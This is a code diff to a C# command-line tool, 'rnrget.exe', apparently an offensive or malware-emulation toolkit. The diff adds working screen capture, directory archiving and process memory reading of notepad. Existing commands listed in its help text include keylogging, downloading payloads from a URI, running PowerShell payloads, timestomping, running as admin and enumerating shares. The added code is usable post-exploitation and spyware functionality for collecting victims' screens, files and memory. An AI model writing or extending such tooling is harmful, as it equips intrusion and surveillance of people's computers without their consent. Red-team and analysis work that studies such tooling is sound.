@@ -10,6 +10,8 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Windows.Forms;
+using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace rnr
 {
@@ -417,6 +419,7 @@ namespace rnr
                 }
                 #endregion
             }
+        
         class get
         {
             static void Main(string[] args)
@@ -540,6 +543,18 @@ namespace rnr
                 else if (args[0] == "keylog")
                 {
                     keylog();
+                }
+                else if (args[0] == "arch")
+                {
+                    arch(args[1], args[2]);
+                }
+                else if (args[0] == "screencap")
+                {
+                    screencap(args[1]);
+                }
+                else if (args[0] == "readmem")
+                {
+                    readmem();
                 }
                 else
                 {
@@ -743,7 +758,7 @@ namespace rnr
                 Console.Write(payload);
                 string formatted = "\"\"\"" + payload + "\"\"\"";
                 /*
-                Process.Start(@"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", formatted);
+                Process.Start("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", formatted);
                 */
                 Console.WriteLine(formatted);
                 ProcessStartInfo startInfo = new ProcessStartInfo();
@@ -759,11 +774,41 @@ namespace rnr
                 Uri u = new Uri(uri);
                 string payload = wc.DownloadString(u);
             }
+            static void arch(string src, string dest)
+            {
+                System.IO.Compression.ZipFile.CreateFromDirectory(src, dest);
+            }
+            static void screencap(string dest)
+            {
+                Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics graphics = Graphics.FromImage(screencap as Image);
+                graphics.CopyFromScreen(0, 0, 0, 0, screencap.Size);
+                screencap.Save(dest, ImageFormat.Jpeg);
+            }
+            [DllImport("kernel32.dll")]
+            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+            [DllImport("kernel32.dll")]
+            public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
+            const int PROCESS_WM_READ = 0x0010;
+
+            static void readmem()
+            {
+                Process process = Process.GetProcessesByName("notepad")[0];
+                IntPtr processHandle = OpenProcess(PROCESS_WM_READ, false, process.Id);
+
+                int bytesRead = 0;
+                byte[] buffer = new byte[24];
+                ReadProcessMemory((int)processHandle, 0x0, buffer, buffer.Length, ref bytesRead);
+                Console.WriteLine(Encoding.Unicode.GetString(buffer) + " (" + bytesRead.ToString() + "bytes)");
+                Console.ReadLine();
+            }
             static void help()
             {
                 Console.WriteLine("Command      Description                 Format");
                 Console.WriteLine("-------      -----------                 ------");
                 Console.WriteLine("help         display help menu           rnrget.exe help, rnrget.exe /?, rnrget.exe ?");
+                Console.WriteLine("arch         create zip file from dir    rnrget.exe arch <source path> <destination path>, rnrget.exe arch C:\\Users\\srcdir C:\\Users\\dest.zip");
                 Console.WriteLine("cp           copy files                  rnrget.exe cp <source path> <destination path>, rnrget.exe cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
                 Console.WriteLine("del          delete files                rnrget.exe del <target path>, rnrget.exe del C:\\Users\\Admin\\targetfile.txt");
                 Console.WriteLine("dld          download payloads           rnrget.exe dld <download path> <URI>, rnrget.exe dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
@@ -777,6 +822,7 @@ namespace rnr
                 Console.WriteLine("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt");
                 Console.WriteLine("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe");
                 Console.WriteLine("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe");
+                Console.WriteLine("screencap    take screenshot             rnrget.exe screencap <save path>, rnrget.exe screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
                 Console.WriteLine("shares       enumerate shares            rnrget.exe shares");
                 Console.WriteLine("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
                 Console.WriteLine("userinfo     get user information        rnrget.exe userinfo");
